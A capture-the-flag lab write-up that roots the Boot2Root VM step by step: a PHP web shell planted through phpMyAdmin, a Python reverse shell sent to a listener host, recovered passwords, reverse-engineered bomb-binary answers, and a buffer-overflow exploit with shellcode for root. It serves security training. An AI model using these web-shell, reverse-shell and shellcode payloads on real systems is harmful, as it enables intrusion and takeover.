### Boot2Root #2

#### Common With Writeup1

#### IP Discovery
```sh
ip addr show
nmap 192.168.100.0/24
nmap -sT -p 80,443 192.168.100.0/24
```
#### Subpages
```sh
nmap --script http-enum 192.168.100.14
```

#### Credentials Of User 'lmezard'

```
https://192.168.100.16/forum/index.php?id=6
```
look there you will find !q\\]Ej?\*5K5cy\*AJ

#### Use 'lmezard' Credentials

```
https://192.168.100.16/forum/index.php?mode=login
```

#### Get More Info about 'lmezard'

```
https://192.168.100.16/forum/index.php?mode=user&action=edit_profile
```

email: *laurie@borntosec.net*

#### Use the email to log in to the webmail with the current password

```
https://192.168.100.16/webmail/src/login.php
```

#### In Webmail,Navigate to

```
https://192.168.100.16/webmail/src/webmail.php
```

And go DB Access

- username: root
- password:Fg-'kKXBj87E:aJ$

#### Log in to phpMyAdmin using root credentials and insert a PHP file for backdoor placement.

```sql
select "<?php echo 'Command: ' . $_POST['cmd'] . '\n'; system($_POST['cmd']);?>" into outfile "/var/www/forum/templates_c/backdoor.php";
```

#### Reverse shell and Listener

```sh
nc -l -vv -p 2000
```

```sh
curl "https://192.168.100.16/forum/templates_c/backdoor.php" --insecure  --data-urlencode  "cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.100.8\",2000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' "
```

### Alternative Method to Gain Root Access
#### Note from the Subject
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/1.png)

Let's explore what the user has access to.

```sh
find / -user www-data -ls > www_data_access.txt
```

Let's apply some filters to the `www_data_access.txt` file.

```sh
grep home www_data_access.txt
```

```
 17389    0 drwxrwx--x   9 www-data root          126 Oct 13  2015 /home
 17392    0 drwxr-x---   2 www-data www-data       31 Oct  8  2015 /home/LOOKATME
 14402    1 -rwxr-x---   1 www-data www-data       25 Oct  8  2015 /home/LOOKATME/password
 13754    1 -rwxr-xr-x   1 www-data www-data      216 Oct  8  2015 /var/www/forum/themes/default/images/homepage.png
   532    0 drwxrwx--x   9 www-data root          126 Oct 13  2015 /rofs/home
   520    0 drwxr-x---   2 www-data www-data       31 Oct  8  2015 /rofs/home/LOOKATME
 14402    1 -rwxr-x---   1 www-data www-data       25 Oct  8  2015 /rofs/home/LOOKATME/password
 13754    1 -rwxr-xr-x   1 www-data www-data      216 Oct  8  2015 /rofs/var/www/forum/themes/default/images/homepage.png
```

Oh, that's interesting: *LOOKATME/password*

```sh
cat /home/LOOKATME/password
```

```
lmezard:G!@M6f4Eatau{sF"
```

#### FTP or SSH

Great, we'be got new credentials! Now, where should we try them? We already have access to
`[forum, webmail, phpmyadmin]`. Wait, wasn't phpmyadmin accessed with the root user? Yes, that's
correct. Since We already have root access, logging as `lmezard` doesn't seem to offer any additional
benefits.

#### Already Completed
- login to forum
- login to phpmyadmin
- login to webmail

#### Cannot Be Done
- login via ssh
- login via ftp

So, let's give them a try.

```sh
ssh lmezard@192.168.100.18
```

No Luck. Let's try FTP next.

```sh
ftp 192.168.100.18
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/2.png)

Okay, We can log in to FTP now. What can We do next?

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/3.png)

Let's check what is stored in these files.

```sh
get README
get fun
```

```sh
cat README
```

```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

#### SSH with laurie

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/4.png)

Let's see what's in `fun`

```sh
tar xf fun
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/5.png)

Keep in mind that our goal now is to log in via SSH using `laurie's` credentials.

It's strange because files with the `*.pcap` extension typically work with Wireshark-related tasks.

So We did

```sh
cat Z5ITS.pcap
```

However, something unusual is appearing.

```c
}void useless() {

//file88
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/6.png)

Perhaps we should reconstruct the C file.

```sh
for file_path in $(ls -l | awk '{print $9}'); do grep //file $file_path | tr -d '\n' >> output; echo ' : ' $file_path >> output; done
cat output | awk -F'file' '{print $2}' | awk '{print $1 " " $3}' > file_and_its_order.txt
sort -n file_and_its_order.txt
```

output would look like this

```
1 YJR5Z.pcap
2 20L0Z.pcap
3 ZP1ZN.pcap
4 BNFBP.pcap
5 331ZU.pcap
6 APM1E.pcap
7 FXG1L.pcap
8 MSHCC.pcap
9 ZFVLR.pcap
10 O2AY2.pcap
11 TMIB0.pcap
12 00M73.pcap
13 9IQDI.pcap
14 LPGCZ.pcap
15 BN32A.pcap
16 2Q5X1.pcap
17 ORGRD.pcap
18 OZJEH.pcap
19 DFO1G.pcap
....
```

Let's obtain the C file.

```sh
for file_name in $(sort -n file_and_its_order.txt | awk '{print $2}'); do cat $file_name >> combined.c ; echo >> combined.c; done
```

Let's compile and run it.

```sh
gcc combined.c -o combined
./combined
```

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

```sh
echo -n Iheartpwnage | sha256sum
```

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

so let's try to login via ssh

- username: laurie
- password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

```sh
ssh laurie@192.168.100.18
```
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/7.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/8.png)

#### Exploiting laurie's binary: 'bomb'

Oh, there's some reverse engineering involved, which I love! We're going to transfer the `bomb` to my
machine so We can use some tools to analyze it.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/9.png)

Now, let's examine the `bomb` binary. BTW We used `ghidra`

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/11.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/10.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/12.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/13.png)

##### Phase 1
Let's take a look at `phase_1`

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/14.png)

As you can see, the first phase is straightforward.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/15.png)

```
answer: Public speaking is very easy.
```

##### Phase 2

```c
void phase_2(undefined4 param_1)
{
  int iVar1;
  int aiStack_20 [7];
  
  read_six_numbers(param_1,aiStack_20 + 1);
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```

As you can see, we need to pass six numbers, and the first one should ensure that the branch is
not taken, i.e first value should be `1`

```c
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
```

And from this

```c
if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1])
```

We can see the pattern.

- aiStack_2 = 2 * aiStack_1
- aiStack_3 = 3 * aiStack_2
- aiStack_4 = 4 * aiStack_3
- aiStack_5 = 5 * aiStack_4
- aiStack_6 = 6 * aiStack_5

since aiStack_1 should be `1` by the first condition

- aiStack_2 = 2 * 1 = 2
- aiStack_3 = 3 * 2 = 6
- aiStack_4 = 4 * 6 = 24
- aiStack_5 = 5 * 24 = 120
- aiStack_6 = 6 * 120 = 720

Yes, it's simply a factorial sequence.

Therefore, we should input.

```
answer: 1 2 6 24 120 720
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/16.png)


##### Phase 3

```c
void phase_3(char *param_1)
{
  int iVar1;
  char cVar2;
  undefined4 local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

```c
switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
...
if (cVar2 != local_9) {
explode_bomb();
}
```

To avoid triggering `explode_bomb`, set local_10 to 0, local_8 to 0x309 (which is 777), and local_9 to 'q'.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/17.png)

```
answer: 0 q 777
```

##### Phase 4

```c
void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}

int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}
```

We only need to input one number, which should be greater than or equal to 1. This number will be 
passed to `func4(num)`, which sould return 0x37=55. As you can see, `func4` is essentially a Fibonacci
sequence. Through some experimentation, We discoverd this.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/18.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/19.png)

```
answer: 9
```

##### Phase 5

```c
void phase_5(int param_1)
{
  int iVar1;
  undefined local_c [6];
  undefined local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array_123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

The length should be 6, and we need `local_c` to be "giants".

Alright, Let's go!

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/20.png)

the operation `(iVar1 + param_1) & 0xf` will give index that will be used in the string
`Arr = "isrveawhobpnutfg"`, and we control *param_1* we need the first character param_1[0]
when combined in that operation give us Arr[15] = 'g', btw a & 0xf = 15, it means that the first
4 bits should be 1, from ascii table there's 'o', next char needs to return 0, cuz we need 'i'
and Arr[0] is equal to 'i' so `[@, p, ..]\`, by repeating the same tricks

The operation `(iVar1 + param_1) & 0xf` will yield an index that is used in the string `Arr = 'isrveawhobpnutfg'`.
Since we control `param_1`, we want `param_1[0]` to produce `Arr[15] = 'g'`. Notably, `a & 0xf = 15`, meaning 
the first 4 bits should be 1. Referring to the ASCII table, that gives us 'o'. The next character needs
to return 0 because we want 'i', and Arr[0] is equal to 'i'. Thus, we can consider values like [@, p, ..],
and we can repeat this trick.

```
answer: opekmq
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/21.png)

##### Last Phase

```c
void phase_6(undefined4 param_1)
{
  int *piVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined1 *local_38;
  int *local_34 [6];
  int local_1c [6];
  
  local_38 = node1;
  read_six_numbers(param_1,local_1c);
  iVar4 = 0;
  do {
    iVar2 = iVar4;
    if (5 < local_1c[iVar4] - 1U) {
      explode_bomb();
    }
    while (iVar2 = iVar2 + 1, iVar2 < 6) {
      if (local_1c[iVar4] == local_1c[iVar2]) {
        explode_bomb();
      }
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);

  iVar4 = 0;
  do {
    iVar2 = 1;
    piVar3 = (int *)local_38;
    if (1 < local_1c[iVar4]) {
      do {
        piVar3 = (int *)piVar3[2];
        iVar2 = iVar2 + 1;
      } while (iVar2 < local_1c[iVar4]);
    }
    local_34[iVar4] = piVar3;
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);

  
  iVar4 = 1;
  piVar3 = local_34[0];
  do {
    piVar1 = local_34[iVar4];
    piVar3[2] = (int)piVar1;
    iVar4 = iVar4 + 1;
    piVar3 = piVar1;
  } while (iVar4 < 6);

  piVar1[2] = 0;
  iVar4 = 0;
  do {
    if (*local_34[0] < *(int *)local_34[0][2]) {
      explode_bomb();
    }
    local_34[0] = (int *)local_34[0][2];
    iVar4 = iVar4 + 1;
  } while (iVar4 < 5);

  return;
}
```

- To exit the first do-while loop, all numbers should be less than or equal to 6, and they must be unique.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/22.png)

It was a bit challenging at first because `ghidra` presented some undefined objects `node1`, However,
we managed to find more information.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/23.png)

So, I’m going to use only GDB for now.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/24.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/25.png)

It appears to be some kind of linked list.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/unique_and_small_or_equal_6.png)

As you can see, the numbers should not exceed 6 and must be unique, which aligns with the conclusion
we reached in `ghidra`.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/fill_internal_array_with_pointers_to_nodes.png)

Fill the internal array of pointers to nodes based on the values we pass. For example,
if we pass 5, 4, ..., the pointer to node 5 will be at index[0], and so on.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/fill_internal_array_with_pointers_to_nodes_first_two.png)

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/link_nodes_stored_in_array.png)

Now, the linked list is updating its next pointers to point to the subsequent nodes according to the previous array.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/compate_nodes.png)

As you can see, if `node->value >= node->next->value`, we will skip the jump, thereby avoiding `explode_bomb`,
which is our goal. We need some numbers that will arrange the nodes in the array according to this
condition specifically in descending order. But what are the values of these nodes in the first place?
Can we control them? Let’s inspect them first.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/node_values.png)

As you can see We need node4, node2, node6, node3, node1 and node5.

```
Answer: 4 2 6 3 1 5
```

##### All
```
Public speaking is very easy.
1 2 6 24 120 720
0 q 777
9
OPEKMQ
4 2 6 3 1 5
```

now we just need to combined them according to the README

```
Publicspeakingisveryeasy.126241207201b2149opekmq426315
```

You may have noticed that we used lowercase `opekmq` and `0 q 777` to `1 b 214` based on the README.
However, We still couldn't log in with `thor`

`https://stackoverflowteams.com/c/42network/questions/664?newreg=b3c414344ce94787a8e40aa3877c1ab8`

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/thor_access_why_switch.png)

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

#### Login Via SSh for thor

```sh
ssh thor@192.168.100.18
password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/thor_access.png)

### thor access

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/turtle.gif)

Since We're somewhat familiar with Manim, I used it to generate the output, which is `SLASH`. Is this
the password?

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/25.png)

It's not working, and at the end of the turtle file, there’s the message: `Can you digest the message? :)`

We believe that `SLASH` needs to undergo some transformation. We’ve already passed one before,
like with sha256sum. Let’s try it.

```sh
echo -n SLASH | sha256sum
2f4f10058af817252c4a9bc174d7b729538079f84f02a74160b3a42162d53e02
```

It’s not working either, but We tried MD5, and that worked.

```sh
echo -n SLASH | md5sum
646da671ca01bb5d84dbb5fb2238dc8e
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/26.png)

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/later/)


#### zaz SSH

```
password: 646da671ca01bb5d84dbb5fb2238dc8e
```

Finally, we need to complete the last step.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/27.png)

Oh, more exploits, but this will be the last one. The file `exploit_me` has the `SUID` flag,
so if we gain a shell through it, we would be root.

### Recon

```sh
strings exploit_me
nm exploit_me
strace ./exploit_me aaaa bbbb
ltrace ./exploit_me aaaaa bfffff
```

```
0804961c d _DYNAMIC
080496e8 d _GLOBAL_OFFSET_TABLE_
0804850c R _IO_stdin_used
         w _Jv_RegisterClasses
0804960c d __CTOR_END__
08049608 d __CTOR_LIST__
08049614 D __DTOR_END__
08049610 d __DTOR_LIST__
08048604 r __FRAME_END__
08049618 d __JCR_END__
08049618 d __JCR_LIST__
0804970c A __bss_start
08049704 D __data_start
080484c0 t __do_global_ctors_aux
08048370 t __do_global_dtors_aux
08049708 D __dso_handle
         w __gmon_start__
080484b2 T __i686.get_pc_thunk.bx
08049608 d __init_array_end
08049608 d __init_array_start
080484b0 T __libc_csu_fini
08048440 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804970c A _edata
08049714 A _end
080484ec T _fini
08048508 R _fp_hw
080482b4 T _init
08048340 T _start
0804970c b completed.6159
08049704 W data_start
08049710 b dtor_idx.6161
080483d0 t frame_dummy
080483f4 T main
         U puts@@GLIBC_2.0
         U strcpy@@GLIBC_2.0
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/28.png)

As you can see, just from these basic commands, We believe we can get a shell running,
especially because we are using strcpy, which has no checks. By the way, our input is being copied
into `0xbffff640`!!. For now, let's keep in mind that we need to overflow this value so that EIP points
to it and starts executing. First, let’s check if ASLR is enabled. The command `cat /proc/sys/kernel/randomize_va_space`
returned 0, meaning ASLR is disabled, so we are on the right track.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/29.png)
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/30.png)

As you can see, there’s a gap of 136 bytes between our input and the point where we will start overriding.
If you notice different addresses, We believe that’s just due to the environment variables that GDB adds,
so don’t worry about it.

So let's input

```sh
gdb --args ./exploit_me $(python -c "print 136*'a' + 'ebpE' + 'adrs'")
```

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/31.png)

```sh
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

We just took it from rainfall project

First attempt

```sh
./exploit_me $(python -c  'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + 106*"a" + 4*"b" + "\x30\xf6\xff\xbf")' )
```

It's not working, but it is functioning in GDB, which is strange. This is often because the input
can influence some aspects of the stack. To investigate further, We used `ltrace` to check it
and adjust the address accordingly.

![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/32.png)

```sh
./exploit_me $(python -c  'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + 115*"a" + 4*"b" + "\x50\xf6\xff\xbf")' )
```

### DONE
![](https://github.com/Gharbaoui/pictures/tree/master/boot2root/write2pics/33.png)

#### Steps
#### Common With Writeup1
#### IP Discovery

```sh
ip addr show
nmap 192.168.100.0/24
nmap -sT -p 80,443 192.168.100.0/24
```

#### Subpages

```sh
nmap --script http-enum 192.168.100.14
```

#### Credentials Of User 'lmezard'

```
https://192.168.100.16/forum/index.php?id=6
```
look there you will find !q\\]Ej?\*5K5cy\*AJ

#### Use 'lmezard' Credentials

```
https://192.168.100.16/forum/index.php?mode=login
```

#### Get More Info about 'lmezard'

```
https://192.168.100.16/forum/index.php?mode=user&action=edit_profile
```

email: *laurie@borntosec.net*

#### Use the email to log in to the webmail with the current password

```
https://192.168.100.16/webmail/src/login.php
```

#### In Webmail,Navigate to

```
https://192.168.100.16/webmail/src/webmail.php
```

And go DB Access

- username: root
- password:Fg-'kKXBj87E:aJ$

#### Log in to phpMyAdmin using root credentials and insert a PHP file for backdoor placement.

```sql
select "<?php echo 'Command: ' . $_POST['cmd'] . '\n'; system($_POST['cmd']);?>" into outfile "/var/www/forum/templates_c/backdoor.php";
```

#### Reverse shell and Listener

```sh
nc -l -vv -p 2000
```

```sh
curl "https://192.168.100.16/forum/templates_c/backdoor.php" --insecure  --data-urlencode  "cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.100.8\",2000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' "
```

#### FTP access

```sh
cat /home/LOOKATME/password
```

```
lmezard:G!@M6f4Eatau{sF"
```

#### SSH with laurie

```sh
tar xf fun

for file_path in $(ls -l | awk '{print $9}'); do grep //file $file_path | tr -d '\n' >> output; echo ' : ' $file_path >> output; done
cat output | awk -F'file' '{print $2}' | awk '{print $1 " " $3}' > file_and_its_order.txt
sort -n file_and_its_order.txt

for file_name in $(sort -n file_and_its_order.txt | awk '{print $2}'); do cat $file_name >> combined.c ; echo >> combined.c; done

gcc combined.c -o combined
./combined
```

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

```sh
echo -n Iheartpwnage | md5sum
```

- username: laurie
- password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

#### Login Via SSh for thor After Defused the bomb

```sh
ssh thor@192.168.100.18
password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

#### zaz access

```sh
echo -n SLASH | md5sum
646da671ca01bb5d84dbb5fb2238dc8e
```

```
username: zaz
password: 646da671ca01bb5d84dbb5fb2238dc8e
```

#### root exploit `root shell`

```sh
./exploit_me $(python -c  'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + 115*"a" + 4*"b" + "\x50\xf6\xff\xbf")' )
```
